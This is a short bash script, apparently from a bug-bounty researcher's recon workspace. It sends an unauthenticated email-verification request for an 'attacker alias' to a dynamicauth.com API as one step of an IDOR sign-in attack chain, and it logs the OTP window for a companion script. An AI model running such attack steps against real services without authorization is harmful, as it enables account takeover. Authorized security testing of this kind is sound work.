#!/bin/bash
# idor13c: fresh UNAUTH emailVerifications/create for attacker alias ev6 (signin flow)
# Purpose of this verification: consumed by idor13b_persist.js -> emailVerifications/signin
# NOTE: no purpose field = natural email-login flow (prior tests confirmed any purpose accepted)
source /home/z/my-project/scripts/tokens.sh
OUT=/home/z/my-project/recon/idor13
mkdir -p $OUT
H1="X-Request-Purpose: Research"; H2="X-Bugcrowd-Ninja: zeno0"; CT="Content-Type: application/json"
ENV_SDK="fb6dd9d1-09f5-43c3-8a8c-eab6e44c37f9"
API="https://app.dynamicauth.com/api/v0"

EMAIL="${1:-zeno0+ev7@bugcrowdninja.com}"
echo "== create UNAUTH: $EMAIL, no purpose (natural signin flow) =="
code=$(curl -s -m 25 -X POST -H "$H1" -H "$H2" -H "$CT" \
  -d "{\"email\":\"$EMAIL\"}" \
  -w "\nHTTPCODE:%{http_code}" "$API/sdk/$ENV_SDK/emailVerifications/create")
echo "$code" > "$OUT/create_${EMAIL##*+}.full"
echo "[$(sed -n 's/.*HTTPCODE://p' <<< "$code")] :: $(grep -v HTTPCODE <<< "$code")"
echo "minted at: $(date -u '+%H:%M:%S UTC') — OTP window ~10 min"
